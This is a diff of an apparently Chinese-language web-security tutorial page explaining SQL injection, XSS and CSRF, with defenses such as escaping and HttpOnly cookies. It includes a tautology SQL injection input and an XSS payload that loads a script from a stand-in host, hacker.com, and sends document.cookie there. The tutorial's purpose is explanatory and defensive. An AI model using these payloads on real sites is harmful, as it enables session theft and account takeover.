@@ -69,7 +69,7 @@
       
   <div id="toc" class="toc-article">
     <!--<strong class="toc-title">目录</strong>-->
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-sql注入"><span class="toc-text">1. sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS跨站脚本攻击"><span class="toc-text">2. XSS跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#恶意脚本"><span class="toc-text">恶意脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如何注入XSS"><span class="toc-text">如何注入XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何阻止攻击"><span class="toc-text">如何阻止攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-CSRF跨站脚本伪造"><span class="toc-text">3. CSRF跨站脚本伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-CSRF攻击行为"><span class="toc-text">3.1 CSRF攻击行为</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-防止CSRF攻击"><span class="toc-text">3.2 防止CSRF攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-同源策略"><span class="toc-text">4. 同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-https"><span class="toc-text">5. https</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-sql注入"><span class="toc-text">1. sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS脚本攻击"><span class="toc-text">2. XSS脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-如何注入恶意脚本"><span class="toc-text">2.1 如何注入恶意脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-如何阻止攻击"><span class="toc-text">2.2 如何阻止攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-CSRF跨站脚本伪造"><span class="toc-text">3. CSRF跨站脚本伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-CSRF攻击行为"><span class="toc-text">3.1 CSRF攻击行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-防止CSRF攻击"><span class="toc-text">3.2 防止CSRF攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-同源策略"><span class="toc-text">4. 同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-https"><span class="toc-text">5. https</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
   </div>
 
 
@@ -94,8 +94,8 @@
 <p>变量id是一个从用户界面传来的值<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string sql = " <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'" + id + "'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></p>
 <p>ID值: <em><code>1&#39; OR &#39;1&#39; = &#39;1</code></em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure></p>
 <p>从users表中的所有数据都查询出来，仅仅通过一个简单的恒真表达式。<br><br></p>
-<h3 id="2-XSS跨站脚本攻击"><a href="#2-XSS跨站脚本攻击" class="headerlink" title="2. XSS跨站脚本攻击"></a>2. XSS跨站脚本攻击</h3><p>黑客通过”HTML注入”篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p>
-<h4 id="恶意脚本"><a href="#恶意脚本" class="headerlink" title="恶意脚本"></a>恶意脚本</h4><p>一旦你浏览已经被黑客留下XSS script的页面，这段js就会执行，cookie信息就会被偷走。黑客可以假冒你的身份做事情了。</p>
+<h3 id="2-XSS脚本攻击"><a href="#2-XSS脚本攻击" class="headerlink" title="2. XSS脚本攻击"></a>2. XSS脚本攻击</h3><p>黑客通过”HTML注入”篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p>
+<h4 id="2-1-如何注入恶意脚本"><a href="#2-1-如何注入恶意脚本" class="headerlink" title="2.1 如何注入恶意脚本"></a>2.1 如何注入恶意脚本</h4><p>一旦你浏览已经被黑客留下XSS script的页面，这段js就会执行，cookie信息就会被偷走。黑客可以假冒你的身份做事情了。</p>
 <p>如果页面被注入恶意js脚本，可以做：</p>
 <ul>
 <li>窃听cookie：通过<code>document.cookie</code>获取cookie信息，发送给恶意服务器</li>
@@ -103,12 +103,12 @@
 <li>修改DOM：伪造假的登录窗口，欺骗用户的用户名和密码</li>
 <li>在页面内生成浮窗广告</li>
 </ul>
-<h4 id="如何注入XSS"><a href="#如何注入XSS" class="headerlink" title="如何注入XSS"></a>如何注入XSS</h4><p>将一段恶意JS代码提交到数据库，用户请求包含恶意js脚本的数据，并注入页面。</p>
-<p>某个黑客发表了一篇文章，在<code>&lt;input&gt;</code>框中输入一段script<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://hacker.com/hack.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>将一段恶意JS代码提交到数据库，用户请求包含恶意js脚本的数据，并注入页面。</p>
+<p>某个黑客发表了一篇文章，在<code>&lt;input&gt;</code>框中输入一段script<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://hacker.com/hack.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <p>hack.js文件中的内容<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p>
-<h3 id="如何阻止攻击"><a href="#如何阻止攻击" class="headerlink" title="如何阻止攻击"></a>如何阻止攻击</h3><ul>
+<h4 id="2-2-如何阻止攻击"><a href="#2-2-如何阻止攻击" class="headerlink" title="2.2 如何阻止攻击"></a>2.2 如何阻止攻击</h4><ul>
 <li><p>对关键字符转码</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转码前</span></span><br><span class="line">code:<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'你被xss攻击了'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码后</span></span><br><span class="line">code:&amp;lt;script&amp;gt;alert(&amp;#39;你被xss攻击了&amp;#39;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转码前</span></span><br><span class="line">code:&lt;script&gt;alert('你被xss攻击了')&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码后</span></span><br><span class="line">code:&amp;lt;script&amp;gt;alert(&amp;#39;你被xss攻击了&amp;#39;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>用<code>HttpOnly</code>保护<code>Cookie</code>的安全</p>
 </li>
@@ -116,7 +116,7 @@
 <li>限制加载其他域下的资源</li>
 </ul>
 <p><br></p>
-<h3 id="3-CSRF跨站脚本伪造"><a href="#3-CSRF跨站脚本伪造" class="headerlink" title="3. CSRF跨站脚本伪造"></a>3. CSRF跨站脚本伪造</h3><h3 id="3-1-CSRF攻击行为"><a href="#3-1-CSRF攻击行为" class="headerlink" title="3.1 CSRF攻击行为"></a>3.1 CSRF攻击行为</h3><p>黑客引诱用户打开黑客的网站，利用用户的登录状态发起跨站请求。</p>
+<h3 id="3-CSRF跨站脚本伪造"><a href="#3-CSRF跨站脚本伪造" class="headerlink" title="3. CSRF跨站脚本伪造"></a>3. CSRF跨站脚本伪造</h3><h4 id="3-1-CSRF攻击行为"><a href="#3-1-CSRF攻击行为" class="headerlink" title="3.1 CSRF攻击行为"></a>3.1 CSRF攻击行为</h4><p>黑客引诱用户打开黑客的网站，利用用户的登录状态发起跨站请求。</p>
 <ul>
 <li>自动发起GET请求</li>
 <li>自动发起POST请求</li>
